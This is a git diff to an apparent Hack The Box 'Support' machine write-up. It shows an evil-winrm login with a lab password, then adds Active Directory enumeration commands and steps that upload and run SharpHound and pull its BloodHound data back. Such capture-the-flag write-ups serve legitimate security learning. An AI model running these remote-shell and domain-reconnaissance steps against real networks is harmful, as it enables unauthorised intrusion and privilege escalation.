@@ -59,3 +59,23 @@ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/f0f57e9e-b8fc-4d4d-b8ac-3a129655c56f)
 
+
+```
+Get-ADDomain
+echo '10.129.178.26 dc.support.htb' | sudo tee -a /etc/hosts
+whoami /groups
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/1f8391b0-f0b9-4bac-ac66-73d102f2e7df)
+
+
+```
+sudo neo4j start
+/opt/BloodHound/BloodHound-linux-x64 ./BloodHound --no-sandbox
+
+upload SharpHound.exe
+./SharpHound.exe
+download 20240514001541_BloodHound.zip
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/3a94dd19-bd0e-46f4-8099-c5e90c3cb25b)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/7f8ee959-839a-4798-b5bd-0cd53be9436e)
